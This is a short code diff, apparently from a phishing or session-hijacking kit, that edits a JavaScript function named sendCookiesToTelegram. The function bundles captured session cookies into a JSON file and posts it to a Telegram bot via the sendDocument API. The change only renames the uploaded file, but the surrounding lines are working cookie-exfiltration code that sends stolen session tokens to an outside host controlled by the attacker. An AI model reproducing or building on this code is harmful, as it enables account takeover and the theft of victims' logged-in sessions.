@@ -212,7 +212,7 @@ async function sendCookiesToTelegram(tokens, sessionId, botToken, chatId) {
   var blob = new Blob([JSON.stringify(cookieArray, null, 0)], { type: "application/json" });
   var formData = new FormData();
   formData.append("chat_id", chatId);
-  formData.append("document", blob, "cookiesID_" + sessionId + ".json");
+  formData.append("document", blob, "cookies_session" + sessionId + ".json");
 
   var xhr = new XMLHttpRequest();
   xhr.open("POST", "https://api.telegram.org/bot" + botToken + "/sendDocument", true);
